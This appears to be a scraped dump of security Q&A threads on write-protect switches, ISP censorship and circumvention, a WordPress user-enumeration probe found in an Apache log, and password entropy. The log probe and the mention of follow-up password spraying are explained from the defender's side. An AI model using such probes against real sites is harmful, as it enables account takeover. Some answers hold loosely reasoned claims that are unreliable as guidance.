<p>Similarly, a lot of valuable content was delivered on floppy disks. I remember the 12 floppy disks necessary to run my first version of Access DB, which I paid good money for. I was quite savvy in computers already, but if not it would be very easy for someone to <em>accidentally</em> erase or corrupt the content of one floppy disk. So once again, a bit of &quot;dumb-proofing&quot; was incorporated into the design (sorry if you find the term &quot;dumb-proofing&quot; offensive, just think of it as &quot;accidental mistake proofing&quot; if it sounds better).</p>
<p>Then the times changed. The new support to deliver valuable digital content was an optical disk, which was not overwritable, so it didn't need that extra layer of accidental erasure protection.</p>
<p>Nowadays, you rarely get CDs anymore (you have to request and pay for it), everything comes to you downloaded from another server. If you corrupt your downloaded files you can just download them again (provided you have the proper license or proof of purchase).</p>
<p>So the physical media we use nowadays to store digital data are mostly used as storage for end users data, they are not used to deliver valuable paid for content. The necessity for protection decreased and as other answers mentioned, the cost to implement something robust enough was not worth mass market adoption, so only a few companies actually implement these features, and obviously have to charge a premium for it.</p>
<p>Note: You could argue that the feature would still be interesting for the mass market as a way to write something &quot;permanently&quot; (write it once and never change it again). A sort of backup. Well, you could use burn-once CD or DVD, or indeed USB sticks which this feature, but the industry consensus on backups nowadays relies more on redundancy than on safeguarding a single physical support. After all, even CDs and USB sticks have a limited useful lifetime before data can get corrupted (without any human interaction). So once again, no need to implement a costly feature for a flawed solution.</p>
<p>The main domain where this feature is really needed is when computer security is involved. That is not a mass market but rather an industry niche. For these applications the feature exists, but it has a certain cost.</p>
","2"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265668","<p>I have a few &quot;recent&quot; (USB 3.0) 2.5&quot; enclosure with write protect (not a physical switch though). I can't speak to how it's implemented and if it can be bypassed.
Also a search for &quot;usb with write protect switch&quot; turns up results including a 16 GB USB 3.0 stick, so I guess &quot;they didn't [all] stop&quot;.</p>
<p>On Linux, you can mount pretty much anything as read-only (yes, it's software enforced, but as somebody else pointed, floppy disks never had a hardware write protect, it was just part of the controller).</p>
<p>On Windows, there's no such option that I'm aware of. A while ago, I made a driver to allow that, it'd mount device with &quot;read-only&quot; option, and as an extra safety, it'd drop any write operation.</p>
<p>The fact is, ultimately, it is extremely unlikely someone would implement that as a hardware option. What I mean is, at best, your flash controller, or your <em>whatever controller</em> (like your USB UMS to SATA bridge) will have a firmware that will check if writing is authorised, and if not, will inform the OS and hopefully will fail any write request.
It could likely be bypassed if the device would have a vulnerability (in the firmware, or a way to upgrade the firmware).</p>
<p>Now I cannot answer your question, you would have to ask every single entity separately to know &quot;why they didn't do it&quot;. My bet is it has to do with cost and market demand. Plus the ever-going evolution that everything hardware gets moved to software (you don't have hardware tuners anymore, you have software defined radios, when you plug your microphone, it no longer physically disable your built-in microphone, it's turned off in software)... It is often cheaper to do software, it can also add convenience, and it adds software upgrade support.</p>
","-1"
"265582","265582","Why did they stop adding physical ""write protect"" mechanism?","<p>Floppy disks used to have a physical means of preventing writing to them. No software could bypass that, no matter what. It had to be flicked physically and manually by a human being.</p>
<p>Modern SD cards and SD card converters have a physical such switch, <strong>but it does not physically prevent anything and only &quot;advises&quot; the software to not write, which it can ignore at will, rendering it completely meaningless and downright deceptive</strong>.</p>
<p>Not a single one of all my many external USB hard disks, even including an older and bigger 3.5&quot; one, have even any such &quot;pretend-switch&quot; on them. Nothing.</p>
<p>Why did they go from allowing physical write protection to not even having a silly &quot;pretend-switch&quot; for this? I've never heard anyone mention this, but to me it's absolutely mindblowing and keeps bothering me every single time I take out my backup media on both disks and memory cards and sticks.</p>
<p>Being able to do this is <strong>crucial</strong> when restoring important backups on potentially malware-infested computers, or when people prone to making honest mistakes are dealing with them and you only want them to be able to fetch/read data but not corrupt/delete it.</p>
<p>It would cost them maybe $0.001 extra per unit to add this. And I haven't even seen it on the really expensive products (except the fake ones on the memory cards mentioned above).</p>
","54","11","265674","<p>For the record, SD cards <a href=""https://raspberrypi.stackexchange.com/a/111008/33476"">do</a> have a write protection mechanism, even if it's firmware only. Look up <code>TMP_WRITE_PROTECT</code>/<code>PERM_WRITE_PROTECT</code> bits in the  <code>CSD</code> register. Obviously, this feature won't offer any protection against a malicious host, but it does help to prevent honest mistakes.</p>
<p>On the other hand, to access SD card write protection flag, you need a card reader which exposes the raw MMC block device (e.g. <code>/dev/mmcblk0</code>) and not just a mass storage device (e.g. <code>/dev/sda</code>) that is the case with most cheap USB card readers. Putting a write-protected SD card in such a card reader protects against malicious hosts as well.</p>
","1"
"265536","265536","Can my ISP censor my internet?","<p>Can the internet be censored from the ISP itself? And what to do if the internet is censored by my ISP?</p>
<p>Even TOR is not showing me the results I want: I had previously searched for the same keywords and got results but now I don't get anything.</p>
<p>I have tried a premium VPN and TOR to browse content but both of them fail. How can I bypass my ISP censorship?</p>
","7","6","265538","<p><strong>Yes, an ISP <em>can</em> restrict your access to the internet. And they <em>do</em> it.</strong></p>
<p>Here are some examples of how they can do it. I added a quick list at the end of what one can do to prevent their ISP to tamper with their connection.</p>
<p>Also, note that <strong>your ISP is not the only component that can implement censorship.</strong> Google could be forced to delist results (eg: after a DMCA takedown notice), and any website can be asked to remove content - legally or illegaly.</p>
<p><strong>Simple blacklist</strong></p>
<p>An ISP can simply have a list of domain names or IP addresses that needs to be blocked. Anytime a request comes to their network for one of these IP address and/or domain name, the ISP can simply drop the connection.</p>
<p>An ISP could also make that decision based on the content of the data transmitted if it is not encrypted.</p>
<p><strong>DNS resolution</strong></p>
<p>When browsing the internet, you usually rely on domain name, such as <a href=""https://security.stackexchange.com"">security.stackexchange.com.</a> However, while convenient for you, your computer will need to request the IP address associated with the domain names. This service uses the DNS protocol and is usually provided by your ISP.</p>
<p>This allows them to block or redirect access to some websites considered as illegal upon a court decision. Here's an example of a court decision instructing ISP to redirect the traffic to a website to a landing page.</p>
<blockquote>
<p><strong>IT IS FURTHER ORDERED that all ISPs [...] and any other ISPs providing services in the United States shall block access to the Website</strong> at any domain address known today. [...] The domain addresses and any Newly-Detected Websites shall be channeled in such a way that <strong>users will be unable to connect and/or use the Website, and will be diverted by the ISPs’ DNS servers to a landing page</strong> operated and controlled by Plaintiffs (the “Landing Page”) which can be reached as follows:</p>
<p>Domain: <a href=""http://zira-usa-11025.org"" rel=""noreferrer"">http://zira-usa-11025.org</a><br />
IP Address: 206.41.119.81 (Dedicated)</p>
<p>Source: <a href=""https://casetext.com/case/united-king-film-distribution-ltd-v-does-1"" rel=""noreferrer"">United King Film Distribution LTD, et al. v. Does 1-10, d/b/a Israeli-tv.com, 21 Civ. 11025 (KPF), Default Judgment And Permanent Injunction Order (Apr. 26, 2022)</a></p>
</blockquote>
<p><strong>BGP</strong></p>
<p>BGP stands for <em>Border Gateway Protocol</em> and is used to interconnect different networks. An ISP can then reroute the traffic to another location, either to make a website unavailable, or to redirect the users to another server. (As seen with the DNS example.)</p>
<p>An example is when the <a href=""https://www.cnet.com/culture/how-pakistan-knocked-youtube-offline-and-how-to-make-sure-it-never-happens-again/"" rel=""noreferrer"">Pakistani PCCW company rerouted traffic to Youtube upon a government request.</a> As the link states, it had unforeseen side effects.</p>
<p><strong>What can I do?</strong></p>
<p>As your trafic initially goes through your ISP network, the main mitigations would be to prevent it from identifying your trafic as suspicious and blocking/redirecting it. A non-exhaustive list of countermeasures could be:</p>
<ul>
<li>Not rely on your DNS provider (see below) which can easily be changed in most OS settings;</li>
<li>Use a proxy or VPN to reroute your trafic to a trusted network;</li>
<li>Use encryption between you and the service requested to avoid any content-based censorship;</li>
<li>Switch to another ISP that do not block the content you want to access.</li>
</ul>
<p>I note that you are using Tor, which should mitigate some of these issues. We would need more information to understand what has been tampered with to make better assumptions on what's happening.</p>
","17"
"265536","265536","Can my ISP censor my internet?","<p>Can the internet be censored from the ISP itself? And what to do if the internet is censored by my ISP?</p>
<p>Even TOR is not showing me the results I want: I had previously searched for the same keywords and got results but now I don't get anything.</p>
<p>I have tried a premium VPN and TOR to browse content but both of them fail. How can I bypass my ISP censorship?</p>
","7","6","265547","<p>Generally speaking, your ISP can't censor Tor or VPNs except by blocking them altogether.</p>
<p>Since you are also &quot;censored&quot; when using Tor and a VPN, it's more likely that either the search engine is censoring your results (if you are using the same one) or else the thing you are trying to find doesn't exist on the Internet any more.</p>
","50"
"265536","265536","Can my ISP censor my internet?","<p>Can the internet be censored from the ISP itself? And what to do if the internet is censored by my ISP?</p>
<p>Even TOR is not showing me the results I want: I had previously searched for the same keywords and got results but now I don't get anything.</p>
<p>I have tried a premium VPN and TOR to browse content but both of them fail. How can I bypass my ISP censorship?</p>
","7","6","265548","<p>Your ISP cannot censor the internet with anything finer than entire DNS hostname or IP address granularity. They cannot modify Google search results or interfere with your ability to use Google short of blocking Google entirely. They cannot modify the content of pages you visit.</p>
<p>Of course, the above is all under some basic key assumptions:</p>
<ul>
<li>The url you're visiting is <code>https://</code> not <code>http://</code>. In 2022 this should be a given, but there are still a very small number of sites that's not the case for.</li>
<li>You did not click through any invalid certificate warnings. This is very unlikely to happen - the ISP is not going to attempt stuff like this because plenty of users will not click through and the ISP will quickly be caught and get in trouble for trying.</li>
<li>You did not install any software provided by your ISP to put backdoors on your computer, often marketed as &quot;malware protection&quot; or &quot;parental control&quot; software. This kind of thing could very well setup your computer to accept fraudulent certificates the ISP (or rather some scummy partner of theirs) uses to impersonate sites and modify their contents. Never install software from an ISP - and that includes VPNs! Because VPNs are a second ISP. Any legitimate VPN will just give you configuration/credentials to install it through your operating system's normal VPN mechanisms, not custom branded software to install.</li>
</ul>
<p>Unless you have installed sketchy software like what I mentioned above, I find it <strong>extremely unlikely</strong> that you're seeing any sort of censorship by your ISP or any other party. More likely, Google just delisted or buried whatever result you're looking for, for their own reasons. You could try searching from somebody else's computer/network to confirm this. Keep in mind that by default Google uses personalized search results, so it's possible that if you still have this on, their personalization for you changed such that they no longer think the same things are relevant to you. I would highly recommend turning off personalized results because of how frustrating it is when stuff like this happens as a result.</p>
","13"
"265536","265536","Can my ISP censor my internet?","<p>Can the internet be censored from the ISP itself? And what to do if the internet is censored by my ISP?</p>
<p>Even TOR is not showing me the results I want: I had previously searched for the same keywords and got results but now I don't get anything.</p>
<p>I have tried a premium VPN and TOR to browse content but both of them fail. How can I bypass my ISP censorship?</p>
","7","6","265551","<p>While ISPs can and do collude with governments to block <strong>access</strong> to web sites, they have no capability to see and alter search engine queries in an encrypted connection.</p>
<p>Search engines, like <em>Google</em>, can and do block results by direction of various government entities.</p>
<p>If you suspect your <strong>search</strong> is being censored:</p>
<ol>
<li><p>Try a different search engine, like <em>DuckDuckGo</em>. Don't login to any of the search engines!</p>
</li>
<li><p>Use a VPN that exits in another country. It may not be sufficient to simply use a VPN if there is a country wide restriction in place, the VPN exit needs to be at a location not subject to the restrictions.</p>
</li>
<li><p>Tor is a special case of VPN but you still need to be sure the exit node is outside the country.</p>
</li>
</ol>
<p>You said, &quot;<em>I have tried a premium VPN and TOR to browse content...</em>&quot;. This implies that you have moved beyond <strong>search</strong> and are now having <strong>access</strong> problems. This is a different issue.</p>
<p><strong>Access</strong> blocks can be implemented in various ways including <em>SNI</em>,<em>DNS</em>, <em>BGP</em>, <em>IP</em>, <em>Others</em>. Some of this can be ISP level, some higher infrastructure. In any case <em>possible</em> workarounds are the same, a VPN exit <em>out-of-country</em>. If the host server being blocked is <em>In-Country</em> you're probably screwed unless they offer an <em>Onion Service</em>.</p>
","1"
"265536","265536","Can my ISP censor my internet?","<p>Can the internet be censored from the ISP itself? And what to do if the internet is censored by my ISP?</p>
<p>Even TOR is not showing me the results I want: I had previously searched for the same keywords and got results but now I don't get anything.</p>
<p>I have tried a premium VPN and TOR to browse content but both of them fail. How can I bypass my ISP censorship?</p>
","7","6","265562","<p>This does not sound like an ISP issue at all.</p>
<p>The search results that you get when you use a search engine are not something that your ISP has any control over at all, at least in normal cases. They are determined by the operator of the search engine.</p>
<p>It is possible that that search engine has removed those websites that you are looking for from its index, or ranked them lower, or that they have simply disappeared from the Web. If you actually still knew the URL of the website that you used to access and can't find anymore now, then you could try to access it again; if that works through Tor but not without Tor, then it could be an ISP issue, but from the facts you have given us, there is nothing that indicates that.</p>
","4"
"265536","265536","Can my ISP censor my internet?","<p>Can the internet be censored from the ISP itself? And what to do if the internet is censored by my ISP?</p>
<p>Even TOR is not showing me the results I want: I had previously searched for the same keywords and got results but now I don't get anything.</p>
<p>I have tried a premium VPN and TOR to browse content but both of them fail. How can I bypass my ISP censorship?</p>
","7","6","265592","<p>The ultimate crux of OPs question also comes down to this specific item: &quot;I have tried a premium VPN and TOR to browse content but both of them fail. How can I bypass my ISP censorship?&quot; (Yes, ISPs can filter, but not fine-grained filtering of searches over TOR/VPN).</p>
<p>You can bypass ALL censorship by, for example, using a colleague in another country who has a &quot;jump server&quot; setup. VPNs are awesome, but they don't always solve your issues; though, as others state, the ISP itself likely is not causing your specific issue, since it would typically block all or nothing. Sounds more like some client-side software on your own computer or network may be filtering things(?)</p>
<p>So, you wanted a solution: we use this solution many places: User from &quot;blocked country&quot; (UserX) has colleague in &quot;non-blocked&quot; country (UserY). UserY sets up a &quot;jump server&quot; to which UserX can connect over VPN. Once you are connected via RDP software such as &quot;remotely,&quot; &quot;TeamViewer,&quot; etc., then you are, effectively, 'inside' the &quot;non-blocked/free&quot; country; and you can browse or perform completely unfiltered searches. Compare this to using some of the other VPN methods where, in most cases, you are not always truly &quot;in&quot; the unblocked country; but you &quot;appear to be&quot; in the unblocked country (depending how the VPN &amp; routing work).</p>
","1"
"265424","265424","Understanding suspicious HTTP GET Request","<p>I was looking through my Apache log files and besides other GET requests with response status codes of 4XX (error), I've found this one which has a 200 (success) response status code:</p>
<pre><code>&quot;GET /?rest_route=/wp/v2/users/ HTTP/1.1&quot; 200 5453 &quot;-&quot; &quot;Go-http-client/1.1&quot;
</code></pre>
<p>First of all, the status code 200 doesn't imply that the request was successful in regards to passing a variable successfully, correct? How would I check then, if such a probe/attack was successful? Would I manually need to go into my files and scan through the code if such a request would do something malicious?</p>
<p>Lastly, what was the bot (I assume it is a bot) trying to achieve with this request specifically? Is it trying to get some data about WordPress users?</p>
","13","3","265425","<p>The reason it counts as &quot;success&quot; is because of the beginning:</p>
<pre><code>/?...
</code></pre>
<p>This means the path the server cares about is <code>/</code>, which likely maps to the index of your web application. The query string after, <code>?rest_route=/wp/v2/users/</code>, is likely ignored by your web application.</p>
<p>In fact, you can try this on a bunch of websites, such as <code>security.stackexchange.com/?rest_route=/wp/v2/users/</code> and you will get a 200 Success code returned.</p>
<h3>How can I check if it was successful?</h3>
<p>In this example, thw &quot;/wp/v2/users/&quot; indicates that the attacker was likely trying to exploit a wordpress misconfiguration to retrieve the list of users through a REST API. If you open your page with that URL and see just the normal index, then it's safe to say that attempt failed.</p>
<p>As for a general answer...that's hard to say. The whole field of digital forensics and incident response is about identifying such indicators of compromise.</p>
","37"
"265424","265424","Understanding suspicious HTTP GET Request","<p>I was looking through my Apache log files and besides other GET requests with response status codes of 4XX (error), I've found this one which has a 200 (success) response status code:</p>
<pre><code>&quot;GET /?rest_route=/wp/v2/users/ HTTP/1.1&quot; 200 5453 &quot;-&quot; &quot;Go-http-client/1.1&quot;
</code></pre>
<p>First of all, the status code 200 doesn't imply that the request was successful in regards to passing a variable successfully, correct? How would I check then, if such a probe/attack was successful? Would I manually need to go into my files and scan through the code if such a request would do something malicious?</p>
<p>Lastly, what was the bot (I assume it is a bot) trying to achieve with this request specifically? Is it trying to get some data about WordPress users?</p>
","13","3","265482","<blockquote>
<p>First of all, the status code 200 doesn't imply that the request was successful in regards to passing a variable successfully, correct?</p>
</blockquote>
<p>It depends on what you mean by <code>to pass a variable successfully</code>.</p>
<p>This aside, the HTTP status code <code>200</code> just means everything went okay.</p>
<p>What <code>okay</code> specifically means is of course dependent on the application.</p>
<p>You're focusing too much on a detail that isn't really important - it doesn't matter what the HTTP response code (your server sent) is or was.</p>
<p><strong>To clarify:</strong></p>
<p>You can't reliably take HTTP response codes as an indicator of whether an attack was attempted or if it was successful or not.
Because that isn't the relevant ; to the attacker it won't matter what the HTTP response code is.</p>
<p><strong>Update:</strong></p>
<p>I want to <a href=""https://security.stackexchange.com/a/265815/161327"">cross</a> reference another post made on this exchange site (emphasis mine):</p>
<blockquote>
<p>Any competent vulnerability scanner <strong>won't check for headers or similar information</strong>; <strong>instead, it'll just try dozens or hundreds of known attacks</strong> and checks if one if them works. [...]
So, any automated scanner will just try out as much as it can in order to not miss out on anything.</p>
</blockquote>
","1"
"265424","265424","Understanding suspicious HTTP GET Request","<p>I was looking through my Apache log files and besides other GET requests with response status codes of 4XX (error), I've found this one which has a 200 (success) response status code:</p>
<pre><code>&quot;GET /?rest_route=/wp/v2/users/ HTTP/1.1&quot; 200 5453 &quot;-&quot; &quot;Go-http-client/1.1&quot;
</code></pre>
<p>First of all, the status code 200 doesn't imply that the request was successful in regards to passing a variable successfully, correct? How would I check then, if such a probe/attack was successful? Would I manually need to go into my files and scan through the code if such a request would do something malicious?</p>
<p>Lastly, what was the bot (I assume it is a bot) trying to achieve with this request specifically? Is it trying to get some data about WordPress users?</p>
","13","3","265932","<blockquote>
<p>First of all, the status code 200 doesn't imply that the request was successful in regards to passing a variable successfully, correct?</p>
</blockquote>
<p>correct</p>
<blockquote>
<p>How would I check then, if such a probe/attack was successful?</p>
</blockquote>
<p>Do you have Wordpress installed? if yes, you can try this request yourself and see what it returns. You don't need to worry about it, if you dont have Wordpress installed.</p>
<blockquote>
<p>Would I manually need to go into my files and scan through the code if such a request would do something malicious?
In most cases you just need to know what version you are running of (1) webserver, and (2) web-framework like Wordpress, and whether the version you are running have any exploitable vulnerabilities. If not, you dont need to worry about. If you are running old unpatched software - here is your problem.</p>
</blockquote>
<p>This particular request appears to show user list, so by logic next step would be to brute-force or password spray Wordpress admin account, you can check logs if you have a lot of brute-force activity.</p>
<blockquote>
<p>Lastly, what was the bot (I assume it is a bot) trying to achieve with this request specifically? Is it trying to get some data about WordPress users?</p>
</blockquote>
<p>Most likely the bot is some vulnerability scanner (like Nessus), it is trying thousands of various requests, known to leak information about your system, and collects information about your system's vulnerabilities for further exploitation.</p>
","1"
"265391","265391","Is a sufficiently long password unsafe just because it only consists of 2-3 letter long mixed-case dictionary words and numbers?","<p>Entropy/Length/Complexity of a password is pretty straight forward and cant really vary much.
For Dictionary Similarity, i would <em>assume</em> that a software just checks how many characters in a password would need to change to match any Dictionary password, or e.g. if moving all letters forward / removing dots / changing numbers to letters creates a Dictionary password.</p>
<p>My confusion stems from the fact that the Password Depot 16 &quot;Quality Analyzer&quot; tells me that a certain password has 100% Dictionary Similarity. Now, i know that a Password Dictionary doesnt consist of actual words like a real one.</p>
<p>The password (not a security concern anymore) is: AT78EHpsMe9</p>
<p>I put this into <a href=""http://password-checker.online-domain-tools.com/"" rel=""nofollow noreferrer"">one of the many online password check tools</a> and it gave me this result:</p>
<blockquote>
<p>'AT78' + 'EHp' + 'sMe9' is not a safe word combination. The word is composed of three components: 1) The string 'AT78' follows the pattern [dictionary word][one or two digits].2) 'EHp' is a dictionary word.3) The string 'sMe9' follows the pattern [dictionary word][one or two digits].</p>
</blockquote>
<p>That seems weird to me. If &quot;AT&quot;, &quot;EHP&quot; and SME&quot;, three totally random letter combinations, are part of a dictionary, then i assume this is true for many many other 3-letter combinations. That doesnt make a password unsafe? You could argue it doesnt have special characters, but i dont get the reasoning above. To make sure i tested it on a more <a href=""https://password.kaspersky.com/"" rel=""nofollow noreferrer"">reputable site</a>, but i got a similar result:</p>
<blockquote>
<p>Your password is easily crackable.
Frequently used words</p>
</blockquote>
<p>This site even claimed it could be cracked &quot;faster than the time it takes to get back from a short walk&quot;? I personally dont count &quot;AT&quot; &quot;EHP&quot; and &quot;SME&quot; to my &quot;frequently&quot; used words, whats that about?</p>
<p>So my initial confusion was just, &quot;what is Password Depot 16 actually checking Dictionary Similarities with&quot; - but assuming that it just uses the same sources as those two sites, i want to know, is this just a false positive from the algorithm, or is that password actually unsafe, just because it has gibberish 3-Letter &quot;words&quot; that are matched in a Dictionary?</p>
","3","3","265396","<p>Every tool will evaluate differently and it's up to you to decide.</p>
<p>The first tool you looked at seems to be trying to sell you a generated password and be not be very reliable.
The same password you tested (<code>AT78EHpsMe9</code>), on <a href=""https://www.security.org/how-secure-is-my-password/"" rel=""nofollow noreferrer"">this</a> website says it will take 41 years to crack. Is that not secure? Up to you.</p>
<p>The Kaspersky tool seems to be trying to sell you something too which is why right after you enter the password a banner to redirect you to another page regarding password complexity is displayed.</p>
<p>Regarding the dictionary attack - as far as I know, dictionary attacks can only work on the entire string as it is comparing the hash. Therefor, I would ignore anyone that is trying to tell you that a sequence in the string matters when it is only two characters out of many.</p>
<p>The chance of the password <code>AT78EHpsMe9</code> being in an already made dictionary is low but the calculation is based on if you generated a dictionary using A-z and 0-9 how long will it take to generate that specific string.</p>
<p>I would suggest using a neutral website such as <a href=""https://apps.fo.unc.edu/it/password-complexity-checker/"" rel=""nofollow noreferrer"">this</a> one provided by the University of North Carolina.</p>
","0"
"265391","265391","Is a sufficiently long password unsafe just because it only consists of 2-3 letter long mixed-case dictionary words and numbers?","<p>Entropy/Length/Complexity of a password is pretty straight forward and cant really vary much.
For Dictionary Similarity, i would <em>assume</em> that a software just checks how many characters in a password would need to change to match any Dictionary password, or e.g. if moving all letters forward / removing dots / changing numbers to letters creates a Dictionary password.</p>
<p>My confusion stems from the fact that the Password Depot 16 &quot;Quality Analyzer&quot; tells me that a certain password has 100% Dictionary Similarity. Now, i know that a Password Dictionary doesnt consist of actual words like a real one.</p>
<p>The password (not a security concern anymore) is: AT78EHpsMe9</p>
<p>I put this into <a href=""http://password-checker.online-domain-tools.com/"" rel=""nofollow noreferrer"">one of the many online password check tools</a> and it gave me this result:</p>
<blockquote>
<p>'AT78' + 'EHp' + 'sMe9' is not a safe word combination. The word is composed of three components: 1) The string 'AT78' follows the pattern [dictionary word][one or two digits].2) 'EHp' is a dictionary word.3) The string 'sMe9' follows the pattern [dictionary word][one or two digits].</p>
</blockquote>
<p>That seems weird to me. If &quot;AT&quot;, &quot;EHP&quot; and SME&quot;, three totally random letter combinations, are part of a dictionary, then i assume this is true for many many other 3-letter combinations. That doesnt make a password unsafe? You could argue it doesnt have special characters, but i dont get the reasoning above. To make sure i tested it on a more <a href=""https://password.kaspersky.com/"" rel=""nofollow noreferrer"">reputable site</a>, but i got a similar result:</p>
<blockquote>
<p>Your password is easily crackable.
Frequently used words</p>
</blockquote>
<p>This site even claimed it could be cracked &quot;faster than the time it takes to get back from a short walk&quot;? I personally dont count &quot;AT&quot; &quot;EHP&quot; and &quot;SME&quot; to my &quot;frequently&quot; used words, whats that about?</p>
<p>So my initial confusion was just, &quot;what is Password Depot 16 actually checking Dictionary Similarities with&quot; - but assuming that it just uses the same sources as those two sites, i want to know, is this just a false positive from the algorithm, or is that password actually unsafe, just because it has gibberish 3-Letter &quot;words&quot; that are matched in a Dictionary?</p>
","3","3","265404","<blockquote>
<p>'AT78' + 'EHp' + 'sMe9' is not a safe word combination. The word is composed of three components: 1) The string 'AT78' follows the pattern [dictionary word][one or two digits].2) 'EHp' is a dictionary word.3) The string 'sMe9' follows the pattern [dictionary word][one or two digits].</p>
</blockquote>
<p>This seems pretty dubious, but let's do some rough maths to get an idea of it. <code>AT</code> is obviously common, but <code>EHp</code> and <code>sMe</code> are somewhat less so. From a quick search of the common rockyou lists (~14 million entries), none of those three terms are in it exactly.</p>
<p>But let's be generous and assume that they're all in a wordlist, which has 20,000 entries.</p>
<p>The first fragment is a one entry from our wordlist plus two digits (so <code>20000*10*10</code>), the second is in our wordlist (<code>20000</code>) and the third is in our wordlist plus one digit (<code>20000*10</code>). Multiple them together and we get 8,000,000,000,000,000, which is roughly <code>2^49</code>.</p>
<p>This means that an attacker knows that we formed out password this way, <em>and</em> they have the exact 20,000 wordlist that happens to contain these three fragments, the password has ~49 bits of entropy. For comparison, eight mixed-alphanumeric characters has ~48 bits of entropy.</p>
<p>So by making some <em>very</em> generous assumptions about how knowledgeable our attacker is, we have a password that's effectively impossible to brute-force if it's stored properly (bcrypt, PBKFD2, argon2id, etc), or that could be brute-forced on a GPU if it's not (MD5, SHA-1, NTLM, etc).</p>
<p>But in reality it would be much harder to crack than 8 random mixed-alphanumeric characters - because an attacker is unlikely to have that knowledge and that perfect wordlist.</p>
","3"
"265391","265391","Is a sufficiently long password unsafe just because it only consists of 2-3 letter long mixed-case dictionary words and numbers?","<p>Entropy/Length/Complexity of a password is pretty straight forward and cant really vary much.
For Dictionary Similarity, i would <em>assume</em> that a software just checks how many characters in a password would need to change to match any Dictionary password, or e.g. if moving all letters forward / removing dots / changing numbers to letters creates a Dictionary password.</p>
<p>My confusion stems from the fact that the Password Depot 16 &quot;Quality Analyzer&quot; tells me that a certain password has 100% Dictionary Similarity. Now, i know that a Password Dictionary doesnt consist of actual words like a real one.</p>
<p>The password (not a security concern anymore) is: AT78EHpsMe9</p>
<p>I put this into <a href=""http://password-checker.online-domain-tools.com/"" rel=""nofollow noreferrer"">one of the many online password check tools</a> and it gave me this result:</p>
<blockquote>
<p>'AT78' + 'EHp' + 'sMe9' is not a safe word combination. The word is composed of three components: 1) The string 'AT78' follows the pattern [dictionary word][one or two digits].2) 'EHp' is a dictionary word.3) The string 'sMe9' follows the pattern [dictionary word][one or two digits].</p>
</blockquote>
<p>That seems weird to me. If &quot;AT&quot;, &quot;EHP&quot; and SME&quot;, three totally random letter combinations, are part of a dictionary, then i assume this is true for many many other 3-letter combinations. That doesnt make a password unsafe? You could argue it doesnt have special characters, but i dont get the reasoning above. To make sure i tested it on a more <a href=""https://password.kaspersky.com/"" rel=""nofollow noreferrer"">reputable site</a>, but i got a similar result:</p>
<blockquote>
<p>Your password is easily crackable.
Frequently used words</p>
</blockquote>
<p>This site even claimed it could be cracked &quot;faster than the time it takes to get back from a short walk&quot;? I personally dont count &quot;AT&quot; &quot;EHP&quot; and &quot;SME&quot; to my &quot;frequently&quot; used words, whats that about?</p>
<p>So my initial confusion was just, &quot;what is Password Depot 16 actually checking Dictionary Similarities with&quot; - but assuming that it just uses the same sources as those two sites, i want to know, is this just a false positive from the algorithm, or is that password actually unsafe, just because it has gibberish 3-Letter &quot;words&quot; that are matched in a Dictionary?</p>
","3","3","265570","<p>That Dictionary attack check is suspect. It was probably intended to be a numbered list (which might say something about the site…), so I'll just fix that:</p>
<blockquote>
<p>'AT78' + 'EHp' + 'sMe9' is not a safe word combination. The word is composed of three components:</p>
<ol>
<li>The string 'AT78' follows the pattern [dictionary word][one or two digits].</li>
<li>'EHp' is a dictionary word.</li>
<li>The string 'sMe9' follows the pattern [dictionary word][one or two digits].</li>
</ol>
</blockquote>
<p><strong>Password entropy applies to password <em>schemes</em></strong></p>
<p>Given a sample password, deriving its complexity requires guessing its scheme. This can be obvious, as it is for <code>password</code> (a word), <code>pa55w0rd</code> (a l33t word), <code>password123</code> (word + number), or it can be nontrivial. It therefore seems reasonable for a calculator unaware of password schemes to seek words.</p>
<p><strong>Let's look for words</strong></p>
<p>Finding words in a passcode and therefore concluding it's weak is not a great approach. Even if we were to assume &quot;EHp&quot; and &quot;sMe&quot; are common enough to be alongside &quot;AT&quot; in a standard 100k-word dictionary (and they're not even close), this unfairly inflates their entropy—the entropy of a common dictionary word is log₂(100000) = 16 but the entropy of three random letters is only log₂(26³) = 14. To account for random case within a word, multiply by two to power of the word's length <sub><sup>(a three-letter word like <code>EHp</code> has 2³ = 8 case iterations: <code>ehp,​Ehp,​eHp,​ehP,​EHp,​eHP,​EhP,​EHP</code>)</sup></sub>, so for &quot;EHp&quot; and &quot;sMe&quot;, that'd be log₂(100000×2³) = 19 vs log₂(52³) = 17.</p>
<p>Entropy calculations must be worst-case, so small words in an unknown password scheme should be considered random letters.</p>
<p>This answers your direct question—the password in question cannot be analyzed for its &quot;words&quot;, so you can't conclude anything like being &quot;unsafe&quot; on that ground.</p>
<p><strong>If those were words...</strong></p>
<p>If there were longer words, we could talk about how large a dictionary would be needed to crack them. A word too rare to be found in a spelling dictionary should be considered worth roughly three random characters while a word in your spelling dictionary should be valued around two characters. Add one if you use typos, l33t, etc. Never value a word over four random characters.</p>
<p>That password checker's &quot;dictionary attack check&quot; is too aggressive in finding words and too naive to know that words can be good. If we actually used words in this manner, say with <code>kAyaK78CInEMaquiCHe9</code>, the overall entropy is much higher: three words with random case and three digits is log₂(100000³×2¹⁷×10³) = 76. The check still says it's &quot;Not safe!&quot; even though I'd call that equivalent to a password with 11 random characters.</p>
<p><strong>Assume a scheme of 11 chars including a capital, a lowercase, and a number</strong></p>
<p>This is the way I'd prefer to calculate this particular password. Sadly, we have to assume there are no special characters in play, so the entropy is simply the required upper, lower, and digit plus eight random characters that can be any of those groups: log₂(26×26×10×62⁸) = 60. That's not bad, but it's also not great.</p>
